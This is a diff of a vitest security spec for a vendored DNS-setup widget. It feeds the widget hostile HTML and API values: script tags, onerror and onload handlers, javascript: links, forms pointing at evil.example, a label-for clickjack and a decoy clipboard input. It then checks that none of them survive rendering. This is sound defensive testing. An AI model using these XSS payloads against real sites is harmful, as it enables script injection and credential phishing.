@@ -1,509 +1,374 @@
 // src/tests/assets/dnswidget.v1.spec.ts
 //
-// [M-4] Coverage for the vendored Approximated DNS widget hardening:
-// - API-supplied HTML (instruction steps, verify section) is sanitized
-//   before DOM insertion: script/iframe removed, event-handler attributes
-//   stripped, javascript: URIs blocked.
-// - Known-trusted inline onclick patterns are converted to real event
-//   listeners so the widget stays functional without inline handlers.
-// - Selector interpolations (data-apxid, widget_id) are CSS-escaped.
-// - API-derived values in the verify templates are HTML-escaped.
+// RISK-2026-08-14-M09: the vendored Approximated DNS widget, evaluated as
+// shipped, renders hostile remote HTML and hostile API values without
+// producing executable markup, keeps its controls working through delegated
+// data-apxdns-action listeners, and fails closed (text, not HTML) when no
+// sanitizer is installed.
+//
+// vitest's jsdom runs inline handlers (runScripts: 'dangerously'), so a
+// surviving onclick would really execute. Handlers see jsdom's own window,
+// not the test global, so the canary is a DOM write: data-pwned on <body>.
 
+import widgetSource from '@/assets/approximated/dnswidget.v1.js?raw';
+import { sanitizeDnsWidgetHtml } from '@/shared/utils/dnsWidgetHtml';
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
 
-import '@/assets/approximated/dnswidget.v1.js';
-
-interface ApxDnsRecordFixture {
-  apex: string;
-  tld: string;
-  domain: string;
-  host: string;
-  value: string;
-  type: string;
-}
-
-interface ApxDnsWidget {
-  config: {
-    widget_id: string;
-    api_url?: string;
-    token?: string;
-    prefillDomain?: string;
-    verifyAutoScroll?: boolean;
-    dnsRecords?: ApxDnsRecordFixture[];
-  } | null;
-  can_restart?: boolean;
-  temp_records?: ApxDnsRecordFixture[] | null;
-  escapeHtml: (value: unknown) => string;
-  _cssEscape: (value: unknown) => string;
-  _compileTrustedHandler: (value: unknown) => (() => void) | null;
-  _resolveElementChain: (start: Element, expr: string) => Element | null;
-  sanitizeHtmlToFragment: (html: unknown) => DocumentFragment;
-  insertSanitizedHtml: (parent: Element, html: unknown) => void;
+interface ApxDnsUnderTest {
+  init: (config: Record<string, unknown>) => void;
+  stop: () => void;
   renderProviderInstructions: (data: unknown) => void;
-  showEnterDomain: () => void;
-  showManualInstructions: (id: string) => void;
-  verifyRecords: () => void;
-  copyInputText: (el: HTMLInputElement) => void;
+  sanitizeHtml?: (html: string) => string;
+  can_restart?: boolean;
+  actionRoot?: Element | null;
+  config?: unknown;
 }
 
-declare global {
-  interface Window {
-    __apx_pwned?: boolean;
+type TestWindow = Window & { apxDns?: ApxDnsUnderTest };
+const testWindow = window as TestWindow;
+
+const API_URL = 'https://apx.example';
+
+const HOSTILE_STEP = `
+  <div class="apxdns-instruction fixed inset-0" style="position:fixed" id="app">
+    <script>document.body.dataset.pwned='script'</script>
+    <img src="https://cdn.example/logo.png" onerror="document.body.dataset.pwned='img'">
+    <a class="apxdns-provider-login-link" href="javascript:document.body.dataset.pwned='href'" target="_top">Log in</a>
+    <iframe src="https://evil.example"></iframe>
+    <form action="https://evil.example"><input name="password"></form>
+    <button class="apxdns-text-btn" onclick="document.body.dataset.pwned='onclick'">Trap</button>
+    <button class="apxdns-show-manual-instructions-btn"
+      onclick="window.apxDns.showManualInstructions('manual-1')">Show manual steps</button>
+    <div class="apxdns-hide" data-apxid="manual-1">
+      <div class="apxdns-input-copy-container">
+        <input type="text" readonly value="target.example.net">
+        <button class="apxdns-copy-button"
+          onclick="window.apxDns.copyInputText(this.previousElementSibling)">Copy</button>
+      </div>
+    </div>
+    <a class="apxdns-btn-link" href="https://dns.example/apply" target="_blank">Apply</a>
+  </div>`;
+
+const HOSTILE_VERIFY_SECTION = `
+  <div class="apxdns-verify-container">
+    <div id="apxdnswidget-verify-section" class="apxdnswidget-verify-section"></div>
+    <div class="apxdns-verify-btn-loader-container">
+      <button class="apxdns-verify-btn" onclick="window.apxDns.verifyRecords()">Verify</button>
+      <div class="apxdns-verify-loader apxdns-hide"><div class="loader"></div></div>
+    </div>
+    <svg onload="document.body.dataset.pwned='svg'"><path d="M0 0h24"/></svg>
+  </div>`;
+
+const PROVIDER_INSTRUCTIONS = {
+  domain_results: { 'example.com': { steps: [{ html: HOSTILE_STEP }] } },
+  verify_section: { html: HOSTILE_VERIFY_SECTION },
+};
+
+const PAYLOAD = `<img src=x onerror="document.body.dataset.pwned='api'">`;
+
+const HOSTILE_VERIFY_RESPONSE = {
+  records: [
+    {
+      apex: 'example',
+      tld: `com${PAYLOAD}`,
+      domain: 'example.com',
+      host: '@',
+      type: `cname${PAYLOAD}`,
+      combined_host: PAYLOAD,
+      value: `"><svg onload="document.body.dataset.pwned='value'">`,
+      actual_values: `</textarea>${PAYLOAD}`,
+      match: `"><img src=x onerror="document.body.dataset.pwned='match'">`,
+    },
+  ],
+};
+
+/** Let the widget's un-returned fetch().then(resp.json().then()) chains settle. */
+async function settle() {
+  for (let i = 0; i < 10; i++) await Promise.resolve();
+}
+
+function jsonResponse(body: unknown) {
+  return Promise.resolve({ json: () => Promise.resolve(body) });
+}
+
+/** Evaluate the vendored widget source, as the injected <script> would. */
+function loadWidget(): ApxDnsUnderTest {
+  new Function(widgetSource)();
+  return testWindow.apxDns!;
+}
+
+function widgetRoot(): HTMLElement {
+  return document.getElementById('apxdnswidget')!;
+}
+
+function onAttributes(root: Element): string[] {
+  return Array.from(root.querySelectorAll('*')).flatMap((el) =>
+    Array.from(el.attributes)
+      .map((attr) => attr.name.toLowerCase())
+      .filter((name) => name.startsWith('on'))
+  );
+}
+
+function expectNotPwned() {
+  expect(document.body.hasAttribute('data-pwned')).toBe(false);
+}
+
+function expectNoExecutableMarkup(root: Element) {
+  expect(root.querySelector('script, iframe, form, style, object, embed')).toBeNull();
+  expect(onAttributes(root)).toEqual([]);
+  for (const el of Array.from(root.querySelectorAll('[href], [src]'))) {
+    const url = el.getAttribute('href') ?? el.getAttribute('src') ?? '';
+    expect(url.trim().toLowerCase()).not.toMatch(/^(javascript|vbscript|data):/);
   }
 }
 
-const apxDns = (): ApxDnsWidget =>
-  (window as unknown as { apxDns: ApxDnsWidget }).apxDns;
-
-describe('dnswidget.v1 sanitization [M-4]', () => {
-  let widget: HTMLDivElement;
+describe('vendored DNS widget (M09)', () => {
+  let fetchMock: ReturnType<typeof vi.fn>;
+  let writeText: ReturnType<typeof vi.fn>;
 
   beforeEach(() => {
-    document.body.innerHTML = '';
-    widget = document.createElement('div');
-    widget.id = 'apxdnswidget';
-    document.body.appendChild(widget);
-    apxDns().config = { widget_id: 'apxdnswidget' };
-    apxDns().can_restart = false;
-    delete window.__apx_pwned;
+    vi.useFakeTimers({ toFake: ['setTimeout'] }); // token renewal timer
+    document.body.innerHTML = '<div id="apxdnswidget" class="apxdnswidget"></div>';
+    document.body.removeAttribute('data-pwned');
+
+    fetchMock = vi.fn((url: string) =>
+      url.endsWith('/get-provider-instructions')
+        ? jsonResponse(PROVIDER_INSTRUCTIONS)
+        : jsonResponse(HOSTILE_VERIFY_RESPONSE)
+    );
+    vi.stubGlobal('fetch', fetchMock);
+
+    writeText = vi.fn();
+    Object.defineProperty(navigator, 'clipboard', {
+      value: { writeText },
+      configurable: true,
+    });
   });
 
   afterEach(() => {
-    apxDns().config = null;
-    vi.restoreAllMocks();
+    // stop() reads config.widget_id, so the vendor code throws on a second call.
+    if (testWindow.apxDns?.config) testWindow.apxDns.stop();
+    delete testWindow.apxDns;
+    document.body.innerHTML = '';
+    document.body.removeAttribute('data-pwned');
+    vi.unstubAllGlobals();
+    vi.useRealTimers();
   });
 
-  describe('sanitizeHtmlToFragment', () => {
-    it('removes script elements entirely', () => {
-      const frag = apxDns().sanitizeHtmlToFragment(
-        '<div class="apxdns-instruction"><script>window.__apx_pwned = true</' +
-          'script><p>Step one</p></div>'
+  async function initWithDomain(apx: ApxDnsUnderTest) {
+    apx.init({
+      token: 'tok',
+      api_url: API_URL,
+      widget_id: 'apxdnswidget',
+      domain: 'example.com',
+      dnsRecords: [{ type: 'CNAME', host: '@', value: 'target.example.net' }],
+      verifyAutoScroll: false,
+    });
+    await settle();
+  }
+
+  describe('with the sanitizer installed', () => {
+    let apx: ApxDnsUnderTest;
+
+    beforeEach(async () => {
+      apx = loadWidget();
+      apx.sanitizeHtml = sanitizeDnsWidgetHtml;
+      await initWithDomain(apx);
+    });
+
+    it('renders hostile instructions and verify section without executable markup', () => {
+      const root = widgetRoot();
+      expect(fetchMock).toHaveBeenCalledWith(
+        `${API_URL}/get-provider-instructions`,
+        expect.anything()
       );
-      widget.appendChild(frag);
+      expectNoExecutableMarkup(root);
+      expect(root.querySelector('#app')).toBeNull();
+      expect(root.querySelector('.fixed, [style]')).toBeNull();
 
-      expect(widget.querySelector('script')).toBeNull();
-      expect(widget.querySelector('p')?.textContent).toBe('Step one');
-      expect(window.__apx_pwned).toBeUndefined();
+      // Inline handlers that are not widget calls are gone: clicking is inert.
+      root.querySelector<HTMLButtonElement>('.apxdns-text-btn')!.click();
+      expectNotPwned();
     });
 
-    it('removes iframe/object/style elements and their subtrees', () => {
-      const frag = apxDns().sanitizeHtmlToFragment(
-        '<div><iframe src="https://evil.example"></iframe>' +
-          '<object data="x"></object><style>*{display:none}</style>ok</div>'
-      );
-      widget.appendChild(frag);
-
-      expect(widget.querySelector('iframe')).toBeNull();
-      expect(widget.querySelector('object')).toBeNull();
-      expect(widget.querySelector('style')).toBeNull();
-      expect(widget.textContent).toContain('ok');
-    });
-
-    it('strips unknown event-handler attributes', () => {
-      const frag = apxDns().sanitizeHtmlToFragment(
-        '<img src="https://cdn.example/logo.png" onerror="window.__apx_pwned = true">' +
-          '<button onclick="window.__apx_pwned = true" onmouseover="window.__apx_pwned = true">x</button>'
-      );
-      widget.appendChild(frag);
-
-      const img = widget.querySelector('img');
-      const button = widget.querySelector('button');
-      expect(img?.getAttribute('onerror')).toBeNull();
-      expect(button?.getAttribute('onclick')).toBeNull();
-      expect(button?.getAttribute('onmouseover')).toBeNull();
-
-      button?.dispatchEvent(new MouseEvent('click', { bubbles: true }));
-      expect(window.__apx_pwned).toBeUndefined();
-    });
-
-    it('blocks javascript: URIs, including whitespace-smuggled schemes', () => {
-      const frag = apxDns().sanitizeHtmlToFragment(
-        '<a href="javascript:alert(1)">bad</a>' +
-          '<a href="java\nscript:alert(1)">smuggled</a>' +
-          '<a href="https://approximated.app/help">good</a>' +
-          '<a href="/relative/path">relative</a>'
-      );
-      widget.appendChild(frag);
-
-      const anchors = widget.querySelectorAll('a');
-      expect(anchors[0].getAttribute('href')).toBeNull();
-      expect(anchors[1].getAttribute('href')).toBeNull();
-      expect(anchors[2].getAttribute('href')).toBe('https://approximated.app/help');
-      expect(anchors[3].getAttribute('href')).toBe('/relative/path');
-    });
-
-    it('neutralizes form-submission primitives in API fragments', () => {
-      const frag = apxDns().sanitizeHtmlToFragment(
-        '<form action="https://evil.example/harvest" method="post" class="apxdns-form">' +
-          '<input type="password" name="password" form="outer-form">' +
-          '<button type="submit" formaction="https://evil.example/alt">Login</button>' +
-          '</form>'
-      );
-      widget.appendChild(frag);
-
-      // The FORM element itself must not survive, nor any submission target.
-      expect(widget.querySelector('form')).toBeNull();
-      expect(widget.querySelector('[action]')).toBeNull();
-      expect(widget.querySelector('[formaction]')).toBeNull();
-
-      // Children survive (unwrapped) but are inert: no form association via
-      // ancestor or the `form` content attribute.
-      const input = widget.querySelector('input');
-      expect(input).not.toBeNull();
-      expect(input?.getAttribute('form')).toBeNull();
-      expect(input?.form).toBeNull();
-      expect(widget.querySelector('button')?.textContent).toBe('Login');
-    });
-
-    it('strips action even on non-form elements', () => {
-      const frag = apxDns().sanitizeHtmlToFragment(
-        '<div action="https://evil.example">x</div>'
-      );
-      widget.appendChild(frag);
-      expect(widget.querySelector('[action]')).toBeNull();
-    });
-
-    it('rejects protocol-relative URLs on href and src', () => {
-      const frag = apxDns().sanitizeHtmlToFragment(
-        '<a href="//evil.example/phish">pr</a>' +
-          '<a href="/\\evil.example">backslash</a>' +
-          '<a href="\\\\evil.example">unc</a>' +
-          '<img src="//evil.example/x.png">' +
-          '<a href="/ok/path">fine</a>'
-      );
-      widget.appendChild(frag);
-
-      const anchors = widget.querySelectorAll('a');
-      expect(anchors[0].getAttribute('href')).toBeNull();
-      expect(anchors[1].getAttribute('href')).toBeNull();
-      expect(anchors[2].getAttribute('href')).toBeNull();
-      expect(widget.querySelector('img')?.getAttribute('src')).toBeNull();
-      expect(anchors[3].getAttribute('href')).toBe('/ok/path');
-    });
-
-    it('hardens target=_blank anchors and drops other targets', () => {
-      const frag = apxDns().sanitizeHtmlToFragment(
-        '<a href="https://provider.example" target="_blank">login</a>' +
-          '<a href="https://provider.example" target="parentFrame">retarget</a>'
-      );
-      widget.appendChild(frag);
-
-      const anchors = widget.querySelectorAll('a');
-      expect(anchors[0].getAttribute('rel')).toBe('noopener noreferrer');
-      expect(anchors[1].getAttribute('target')).toBeNull();
-    });
-
-    it('preserves benign widget markup and attributes', () => {
-      const html = `
-        <div class="apxdns-instruction">
-          <div class="apxdns-inst-heading">
-            <img class="apxdns-inst-provider-logo" src="https://cdn.example/p.png" alt="Provider">
-            Update records
-          </div>
-          <div class="apxdns-inst-body">
-            <ol class="apxdns-inst-numbered-substeps">
-              <li class="apxdns-inst-numbered-substep">Log in</li>
-            </ol>
-            <div class="apxdns-input-copy-container">
-              <input type="text" readonly value="76.76.21.21">
-              <button class="apxdns-copy-button" type="button">Copy</button>
-            </div>
-            <div data-apxid="manual-1" class="apxdns-hide">Manual steps</div>
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-              <path stroke-linecap="round" d="M9 15 3 9"></path>
-            </svg>
-          </div>
-        </div>`;
-      widget.appendChild(apxDns().sanitizeHtmlToFragment(html));
-
-      expect(widget.querySelector('.apxdns-instruction')).not.toBeNull();
-      expect(widget.querySelector('img')?.getAttribute('src')).toBe(
-        'https://cdn.example/p.png'
-      );
-      expect(widget.querySelector('ol.apxdns-inst-numbered-substeps li')).not.toBeNull();
-      expect(widget.querySelector('input')?.getAttribute('value')).toBe('76.76.21.21');
-      expect(widget.querySelector('[data-apxid="manual-1"]')).not.toBeNull();
-      expect(widget.querySelector('svg path')?.getAttribute('d')).toBe('M9 15 3 9');
-    });
-  });
-
-  describe('trusted onclick conversion', () => {
-    it('binds window.apxDns.verifyRecords() onclick as a real listener', () => {
-      const verifySpy = vi.fn();
-      const original = apxDns().verifyRecords;
-      apxDns().verifyRecords = verifySpy;
-      try {
-        apxDns().insertSanitizedHtml(
-          widget,
-          '<button class="apxdns-verify-btn" onclick="window.apxDns.verifyRecords()">Verify</button>'
-        );
-        const button = widget.querySelector('button');
-        expect(button?.getAttribute('onclick')).toBeNull();
-
-        button?.dispatchEvent(new MouseEvent('click', { bubbles: true }));
-        expect(verifySpy).toHaveBeenCalledTimes(1);
-      } finally {
-        apxDns().verifyRecords = original;
-      }
-    });
-
-    it('binds showManualInstructions with its literal argument', () => {
-      const manualSpy = vi.fn();
-      const original = apxDns().showManualInstructions;
-      apxDns().showManualInstructions = manualSpy;
-      try {
-        apxDns().insertSanitizedHtml(
-          widget,
-          `<button onclick="window.apxDns.showManualInstructions('manual-1')">Manual</button>`
-        );
-        widget.querySelector('button')?.dispatchEvent(new MouseEvent('click', { bubbles: true }));
-        expect(manualSpy).toHaveBeenCalledWith('manual-1');
-      } finally {
-        apxDns().showManualInstructions = original;
-      }
-    });
-
-    it('resolves copyInputText element chains without eval', () => {
-      const copySpy = vi.fn();
-      const original = apxDns().copyInputText;
-      apxDns().copyInputText = copySpy;
-      try {
-        apxDns().insertSanitizedHtml(
-          widget,
-          `<div class="apxdns-input-copy-container">
-            <input type="text" value="76.76.21.21">
-            <button onclick="window.apxDns.copyInputText(this.parentElement.querySelector('input'))">Copy</button>
-          </div>`
-        );
-        widget.querySelector('button')?.dispatchEvent(new MouseEvent('click', { bubbles: true }));
-        expect(copySpy).toHaveBeenCalledTimes(1);
-        expect(copySpy.mock.calls[0][0]).toBe(widget.querySelector('input'));
-      } finally {
-        apxDns().copyInputText = original;
-      }
-    });
-
-    it('does not bind handlers that stray from the trusted patterns', () => {
+    it('keeps the legitimate controls and links', () => {
+      const root = widgetRoot();
+      expect(root.querySelector('[data-apxdns-action="verifyRecords"]')).not.toBeNull();
       expect(
-        apxDns()._compileTrustedHandler(
-          "window.apxDns.showManualInstructions('a'); window.__apx_pwned = true"
-        )
-      ).toBeNull();
-      expect(apxDns()._compileTrustedHandler('alert(1)')).toBeNull();
-      expect(
-        apxDns()._compileTrustedHandler('window.apxDns.copyInputText(alert(1))')
-      ).toBeNull();
-      expect(
-        apxDns()._compileTrustedHandler(
-          "window.apxDns.copyInputText(this.ownerDocument.defaultView.alert(1))"
-        )
-      ).toBeNull();
+        root.querySelector('[data-apxdns-action="showManualInstructions"][data-apxdns-arg="manual-1"]')
+      ).not.toBeNull();
+      expect(root.querySelector('[data-apxdns-action="copyInputText"]')).not.toBeNull();
+      expect(root.querySelector('#apxdnswidget-verify-section')).not.toBeNull();
+
+      const apply = root.querySelector<HTMLAnchorElement>('a.apxdns-btn-link')!;
+      expect(apply.getAttribute('href')).toBe('https://dns.example/apply');
+      expect(apply.getAttribute('target')).toBe('_blank');
+      expect(apply.getAttribute('rel')).toBe('noopener noreferrer');
     });
-  });
 
-  describe('_resolveElementChain', () => {
-    it('resolves allowlisted chains within the widget', () => {
-      widget.innerHTML =
-        '<div class="apxdns-input-copy-container">' +
-        '<input type="text" value="76.76.21.21">' +
-        '<button type="button">Copy</button></div>';
-      const button = widget.querySelector('button')!;
+    it('toggles manual instructions through the delegated listener', () => {
+      const root = widgetRoot();
+      const panel = root.querySelector('[data-apxid="manual-1"]')!;
+      expect(panel.classList.contains('apxdns-hide')).toBe(true);
 
-      const target = apxDns()._resolveElementChain(
-        button,
-        "this.parentElement.querySelector('input')"
+      root.querySelector<HTMLElement>('[data-apxdns-action="showManualInstructions"]')!.click();
+      expect(panel.classList.contains('apxdns-hide')).toBe(false);
+    });
+
+    it('copies the adjacent field through the delegated listener', () => {
+      widgetRoot().querySelector<HTMLElement>('[data-apxdns-action="copyInputText"]')!.click();
+      expect(writeText).toHaveBeenCalledWith('target.example.net');
+    });
+
+    it('verifies records and renders hostile API values as text', async () => {
+      widgetRoot().querySelector<HTMLElement>('[data-apxdns-action="verifyRecords"]')!.click();
+      await settle();
+
+      expect(fetchMock).toHaveBeenCalledWith(
+        `${API_URL}/token/check-records-match-exactly`,
+        expect.anything()
       );
-      expect(target).toBe(widget.querySelector('input'));
-    });
-
-    it('rejects selectors outside the compile-time allowlist', () => {
-      widget.innerHTML = '<div><input name="totp"><button>Copy</button></div>';
-      const button = widget.querySelector('button')!;
-
-      // Attribute selectors ([...]) are outside the allowlisted charset.
-      expect(
-        apxDns()._resolveElementChain(
-          button,
-          "this.parentElement.querySelector('input[name=totp]')"
-        )
-      ).toBeNull();
-
-      // Selectors beyond the 128-char cap never parse.
-      const long = 'a'.repeat(200);
-      expect(
-        apxDns()._resolveElementChain(button, `this.querySelector('${long}')`)
-      ).toBeNull();
-    });
-
-    it('refuses chains that escape the widget container', () => {
-      const outside = document.createElement('input');
-      outside.id = 'outside-secret';
-      outside.value = 'TOTP-SEED-VALUE';
-      document.body.appendChild(outside);
-
-      widget.innerHTML = '<div><button>Copy</button></div>';
-      const button = widget.querySelector('button')!;
-
-      expect(
-        apxDns()._resolveElementChain(
-          button,
-          "this.parentElement.parentElement.parentElement.querySelector('#outside-secret')"
-        )
-      ).toBeNull();
-    });
-
-    it('compiled copy handlers cannot copy content outside the widget', () => {
-      const outside = document.createElement('input');
-      outside.id = 'outside-secret';
-      outside.value = 'TOTP-SEED-VALUE';
-      document.body.appendChild(outside);
-
-      const copySpy = vi.fn();
-      const original = apxDns().copyInputText;
-      apxDns().copyInputText = copySpy;
-      try {
-        apxDns().insertSanitizedHtml(
-          widget,
-          `<button onclick="window.apxDns.copyInputText(this.parentElement.parentElement.parentElement.querySelector('#outside-secret'))">Copy</button>`
-        );
-        widget.querySelector('button')?.dispatchEvent(new MouseEvent('click', { bubbles: true }));
-        expect(copySpy).not.toHaveBeenCalled();
-      } finally {
-        apxDns().copyInputText = original;
-      }
-    });
-  });
-
-  describe('renderProviderInstructions', () => {
-    it('sanitizes instruction steps and the verify section', () => {
-      apxDns().renderProviderInstructions({
-        domain_results: {
-          'example.com': {
-            steps: [
-              {
-                html:
-                  '<div class="apxdns-instruction"><p>Step</p>' +
-                  '<img src="x" onerror="window.__apx_pwned = true"></div>',
-              },
-            ],
-          },
-        },
-        verify_section: {
-          html:
-            '<div id="apxdnswidget-verify-section" class="apxdns-verify-container">' +
-            '<button class="apxdns-verify-btn" onclick="window.apxDns.verifyRecords()">Verify</button>' +
-            '<script>window.__apx_pwned = true</' +
-            'script></div>',
-        },
-      });
-
-      expect(widget.querySelector('.apxdns-instruction p')?.textContent).toBe('Step');
-      expect(widget.querySelector('[onerror]')).toBeNull();
-      expect(widget.querySelector('script')).toBeNull();
-      expect(widget.querySelector('.apxdns-verify-btn')).not.toBeNull();
-      expect(window.__apx_pwned).toBeUndefined();
-    });
-  });
-
-  describe('selector escaping', () => {
-    it('showManualInstructions tolerates hostile data-apxid values', () => {
-      const el = document.createElement('div');
-      const hostileId = "x'] , [data-other='y";
-      el.setAttribute('data-apxid', hostileId);
-      document.body.appendChild(el);
-
-      // Without CSS escaping this selector throws a SyntaxError.
-      expect(() => apxDns().showManualInstructions(hostileId)).not.toThrow();
-      expect(el.classList.contains('apxdns-hide')).toBe(true);
-    });
-
-    it('showManualInstructions still toggles well-formed ids', () => {
-      const el = document.createElement('div');
-      el.setAttribute('data-apxid', 'manual-1');
-      el.className = 'apxdns-hide';
-      document.body.appendChild(el);
-
-      apxDns().showManualInstructions('manual-1');
-      expect(el.classList.contains('apxdns-hide')).toBe(false);
-    });
-  });
-
-  describe('prefill domain', () => {
-    it('assigns prefillDomain via the value property, not markup', () => {
-      apxDns().config = {
-        widget_id: 'apxdnswidget',
-        prefillDomain: '"><img src=x onerror=window.__apx_pwned=true>',
-      };
-      apxDns().showEnterDomain();
-
-      const input = widget.querySelector<HTMLInputElement>('.apxdns-domain-input');
-      expect(input?.value).toBe('"><img src=x onerror=window.__apx_pwned=true>');
-      expect(widget.querySelector('img')).toBeNull();
-      expect(window.__apx_pwned).toBeUndefined();
-    });
-  });
-
-  describe('verifyRecords output escaping', () => {
-    it('escapes API-derived record values in the verify templates', async () => {
-      apxDns().config = {
-        widget_id: 'apxdnswidget',
-        api_url: '',
-        token: 'tok',
-        verifyAutoScroll: false,
-      };
-      apxDns().temp_records = [
-        { apex: 'a', tld: 'com', domain: 'a.com', host: '@', value: 'v', type: 'A' },
-      ];
-
-      widget.innerHTML =
-        '<button class="apxdns-verify-btn">Verify</button>' +
-        '<div class="apxdns-verify-loader apxdns-hide"></div>' +
-        '<div id="apxdnswidget-verify-section"></div>';
-
-      vi.mocked(global.fetch).mockResolvedValue({
-        json: () =>
-          Promise.resolve({
-            records: [
-              {
-                apex: 'a',
-                tld: 'com',
-                match: false,
-                type: 'a',
-                combined_host: '<b>host</b>',
-                value: '<img src=x onerror="window.__apx_pwned = true">',
-                actual_values:
-                  '</textarea><script>window.__apx_pwned = true</' + 'script>',
-              },
-            ],
-          }),
-      } as unknown as Response);
-
-      apxDns().verifyRecords();
-
       const section = document.getElementById('apxdnswidget-verify-section')!;
-      await vi.waitFor(() => {
-        expect(section.querySelector('.apxdns-verify-record')).not.toBeNull();
+      expectNoExecutableMarkup(section);
+      expect(section.querySelector('img, svg')).toBeNull();
+      expect(section.querySelector('.apxdns-verify-record-is-false')).not.toBeNull();
+      expect(section.textContent).toContain(PAYLOAD);
+      expect(section.querySelector('textarea')!.value).toBe(`</textarea>${PAYLOAD}`);
+      expectNotPwned();
+    });
+
+    it('removes its delegated listeners on stop', () => {
+      const root = widgetRoot();
+      apx.stop();
+      expect(apx.actionRoot).toBeNull();
+
+      root.innerHTML = '<div class="apxdns-copy-button" data-apxdns-action="copyInputText"></div>';
+      root.querySelector<HTMLElement>('div')!.click();
+      expect(writeText).not.toHaveBeenCalled();
+    });
+
+    /** Re-render the widget with one instruction step. */
+    function renderStep(html: string) {
+      apx.renderProviderInstructions({
+        domain_results: { 'example.com': { steps: [{ html }] } },
+        verify_section: { html: '<div id="apxdnswidget-verify-section"></div>' },
       });
+    }
 
-      expect(section.querySelector('script')).toBeNull();
-      expect(section.querySelector('img')).toBeNull();
-      expect(section.querySelector('b')).toBeNull();
-      expect(section.textContent).toContain('<b>host</b>');
-      const textarea = section.querySelector('textarea');
-      expect(textarea?.value).toContain('</textarea><script>');
-      expect(window.__apx_pwned).toBeUndefined();
+    // SEC-F7: the vendor copied this.previousElementSibling; a hidden first
+    // input in the same container must not be what lands on the clipboard.
+    it('copies the input just before the button, not the first in its container', () => {
+      renderStep(`
+        <div class="apxdns-input-copy-container">
+          <input class="apxdns-hide" value="attacker.example">
+          <input value="target.example.net">
+          <button class="apxdns-copy-button"
+            onclick="window.apxDns.copyInputText(this.previousElementSibling)">Copy</button>
+        </div>`);
 
-      apxDns().temp_records = null;
+      widgetRoot().querySelector<HTMLElement>('[data-apxdns-action="copyInputText"]')!.click();
+
+      expect(writeText).toHaveBeenCalledTimes(1);
+      expect(writeText).toHaveBeenCalledWith('target.example.net');
+    });
+
+    it("falls back to the container's input when the button does not follow one", () => {
+      renderStep(`
+        <div class="apxdns-input-copy-container">
+          <input value="target.example.net">
+          <span>record value</span>
+          <button class="apxdns-copy-button"
+            onclick="window.apxDns.copyInputText(this.previousElementSibling)">Copy</button>
+        </div>`);
+
+      widgetRoot().querySelector<HTMLElement>('[data-apxdns-action="copyInputText"]')!.click();
+
+      expect(writeText).toHaveBeenCalledWith('target.example.net');
+    });
+
+    // SEC-F1: a remote <label for> must not click an app control by id.
+    it('does not let remote markup click an app control outside the widget', () => {
+      const appControl = document.createElement('button');
+      appControl.id = 'app-danger';
+      document.body.prepend(appControl);
+      const appClicks = vi.fn();
+      appControl.addEventListener('click', appClicks);
+
+      renderStep(
+        '<label for="app-danger" class="apxdns-show-manual-instructions-btn">Show</label>'
+      );
+      const label = widgetRoot().querySelector<HTMLLabelElement>('label')!;
+      expect(label.hasAttribute('for')).toBe(false);
+      label.click();
+
+      expect(appClicks).not.toHaveBeenCalled();
     });
   });
 
-  describe('escapeHtml', () => {
-    it('escapes markup-significant characters', () => {
-      expect(apxDns().escapeHtml(`<img src="x" onerror='p'>&`)).toBe(
-        '&lt;img src=&quot;x&quot; onerror=&#39;p&#39;&gt;&amp;'
+  describe('without a sanitizer (fail closed)', () => {
+    it('inserts remote HTML as text', async () => {
+      const apx = loadWidget();
+      expect(apx.sanitizeHtml).toBeUndefined();
+      await initWithDomain(apx);
+
+      const root = widgetRoot();
+      expect(root.children).toHaveLength(0);
+      expect(root.querySelector('img, button, a, svg')).toBeNull();
+      expect(root.textContent).toContain('<script>');
+      expect(root.textContent).toContain('onclick="window.apxDns.verifyRecords()"');
+      expectNotPwned();
+    });
+  });
+
+  describe("the widget's own templates", () => {
+    it('escapes prefillDomain and submits the form without an inline handler', async () => {
+      const apx = loadWidget();
+      apx.sanitizeHtml = sanitizeDnsWidgetHtml;
+      const prefill = `"><img src=x onerror="document.body.dataset.pwned='prefill'">`;
+      apx.init({
+        token: 'tok',
+        api_url: API_URL,
+        widget_id: 'apxdnswidget',
+        prefillDomain: prefill,
+        dnsRecords: [{ type: 'CNAME', host: '@', value: 'target.example.net' }],
+        verifyAutoScroll: false,
+      });
+
+      const root = widgetRoot();
+      const form = root.querySelector('form')!;
+      expect(form.getAttribute('data-apxdns-action')).toBe('submitDomain');
+      expect(onAttributes(root)).toEqual([]);
+      expect(root.querySelector('img')).toBeNull();
+      const input = root.querySelector<HTMLInputElement>('input[name="apxdns-domain-input"]')!;
+      expect(input.value).toBe(prefill);
+
+      const submitted = vi.fn();
+      document.addEventListener('apx-dnswidget-user-submitted-domain', submitted);
+      input.value = 'example.com';
+      form.dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
+      document.removeEventListener('apx-dnswidget-user-submitted-domain', submitted);
+      await settle();
+
+      expect(submitted).toHaveBeenCalledTimes(1);
+      expect(fetchMock).toHaveBeenCalledWith(
+        `${API_URL}/get-provider-instructions`,
+        expect.anything()
       );
-      expect(apxDns().escapeHtml(null)).toBe('');
-      expect(apxDns().escapeHtml(true)).toBe('true');
+      expectNotPwned();
+    });
+
+    it('restarts through the delegated listener', async () => {
+      const apx = loadWidget();
+      apx.sanitizeHtml = sanitizeDnsWidgetHtml;
+      await initWithDomain(apx);
+      apx.can_restart = true;
+      apx.renderProviderInstructions(PROVIDER_INSTRUCTIONS);
+
+      const restart = widgetRoot().querySelector<HTMLElement>('[data-apxdns-action="restart"]')!;
+      expect(restart.hasAttribute('onclick')).toBe(false);
+      restart.click();
+
+      expect(widgetRoot().querySelector('form[data-apxdns-action="submitDomain"]')).not.toBeNull();
     });
   });
 });
